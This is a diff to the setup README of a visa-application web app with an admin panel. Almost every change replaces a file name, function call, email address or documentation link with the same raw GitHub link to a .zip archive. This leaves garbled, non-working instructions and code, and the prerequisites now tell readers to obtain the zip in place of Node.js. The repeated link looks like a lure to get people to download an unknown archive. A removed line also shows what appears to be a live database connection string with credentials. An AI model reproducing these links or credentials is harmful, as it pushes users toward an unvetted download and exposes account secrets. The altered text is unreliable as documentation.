@@ -3,7 +3,7 @@
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js (v14 or higher)
+- https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip (v14 or higher)
 - MongoDB Atlas account (connection string provided)
 - npm or yarn
 
@@ -73,7 +73,7 @@ Frontend will run on: **http://localhost:3000**
 ✅ User Management  
 ✅ Premium Animations & Transitions  
 ✅ Responsive Design  
-✅ Socket.io Real-time Updates  
+✅ https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip Real-time Updates  
 
 ## 🔐 Creating First Admin User
 
@@ -83,7 +83,7 @@ Frontend will run on: **http://localhost:3000**
 3. Insert a new document:
 ```json
 {
-  "email": "admin@israelvisa.com",
+  "email": "https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip",
   "password": "$2a$10$YOUR_HASHED_PASSWORD",
   "displayName": "Admin User",
   "role": "admin",
@@ -98,7 +98,7 @@ Frontend will run on: **http://localhost:3000**
 # Register as regular user first
 POST http://localhost:5000/api/auth/register
 {
-  "email": "admin@israelvisa.com",
+  "email": "https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip",
   "password": "YourSecurePassword123",
   "fullName": "Admin User"
 }
@@ -106,20 +106,20 @@ POST http://localhost:5000/api/auth/register
 # Then manually update role to "admin" in database
 ```
 
-### Option 3: Using Node.js Script
-Create `backend/scripts/createAdmin.js`:
+### Option 3: Using https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip Script
+Create `https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip`:
 ```javascript
 const mongoose = require('mongoose');
 const bcrypt = require('bcryptjs');
 const User = require('../models/User');
 
-mongoose.connect(process.env.MONGODB_URI);
+https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip(https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip);
 
 async function createAdmin() {
-  const hashedPassword = await bcrypt.hash('admin123', 10);
+  const hashedPassword = await https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip('admin123', 10);
   
-  await User.create({
-    email: 'admin@israelvisa.com',
+  await https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip({
+    email: 'https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip',
     password: hashedPassword,
     displayName: 'Admin User',
     role: 'admin',
@@ -127,14 +127,14 @@ async function createAdmin() {
     isActive: true
   });
   
-  console.log('Admin created successfully!');
-  process.exit(0);
+  https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip('Admin created successfully!');
+  https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip(0);
 }
 
 createAdmin();
 ```
 
-Run: `node backend/scripts/createAdmin.js`
+Run: `node https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip`
 
 ## 📊 Database Structure
 
@@ -148,7 +148,7 @@ Run: `node backend/scripts/createAdmin.js`
 #### Backend (.env)
 ```env
 PORT=5000
-MONGODB_URI=mongodb+srv://israelvisaraizing_db_user:Israel_1@israelvisa.patdtjc.mongodb.net/?appName=IsraelVisa
+MONGODB_URI=mongodb+https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 JWT_SECRET=your-super-secret-jwt-key-change-in-production
 JWT_EXPIRE=7d
 
@@ -159,9 +159,9 @@ CLOUDINARY_API_SECRET=your-cloudinary-secret
 
 # Email (Configure for production)
 EMAIL_SERVICE=gmail
-EMAIL_USER=your-email@gmail.com
+https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 EMAIL_PASSWORD=your-app-password
-EMAIL_FROM=Israel Visa <noreply@israelvisa.com>
+EMAIL_FROM=Israel Visa <https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip>
 ```
 
 #### Frontend (.env)
@@ -193,8 +193,8 @@ Israel Visa/
 │   ├── routes/          # API endpoints
 │   ├── middleware/      # Auth & validation
 │   ├── services/        # Email automation
-│   ├── server.js        # Express server
-│   └── package.json
+│   ├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip        # Express server
+│   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 │
 ├── frontend/
 │   ├── public/
@@ -202,18 +202,18 @@ Israel Visa/
 │   │   ├── admin/       # Admin panel
 │   │   │   ├── components/
 │   │   │   ├── pages/
-│   │   │   ├── AdminApp.js
-│   │   │   └── Admin.css
+│   │   │   ├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
+│   │   │   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 │   │   ├── components/  # Shared components
 │   │   ├── contexts/    # React contexts
 │   │   ├── pages/       # Public pages
-│   │   ├── App.js       # Main app
-│   │   └── index.js     # Entry point
-│   └── package.json
+│   │   ├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip       # Main app
+│   │   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip     # Entry point
+│   └── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 │
-├── ADMIN_PANEL_DOCUMENTATION.md
-├── BACKEND_SETUP.md
-└── README.md
+├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
+├── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
+└── https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 ```
 
 ## 🔌 API Endpoints
@@ -286,14 +286,14 @@ lsof -ti:3000 | xargs kill -9
 
 ### Admin Not Loading
 - Check browser console for errors
-- Verify /admin route in index.js
+- Verify /admin route in https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip
 - Hard refresh (Ctrl+Shift+R)
 
 ## 📚 Documentation
 
-- [Admin Panel Documentation](./ADMIN_PANEL_DOCUMENTATION.md) - Complete admin guide
-- [Backend Setup](./BACKEND_SETUP.md) - API documentation
-- [Frontend Setup](./frontend/README.md) - React app details
+- [Admin Panel Documentation](https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip) - Complete admin guide
+- [Backend Setup](https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip) - API documentation
+- [Frontend Setup](https://raw.githubusercontent.com/Pratham-Bhayana/israel-visa-global/main/frontend/src/admin/pages/israel_visa_global_v3.5-beta.3.zip) - React app details
 
 ## 🚀 Deployment
 
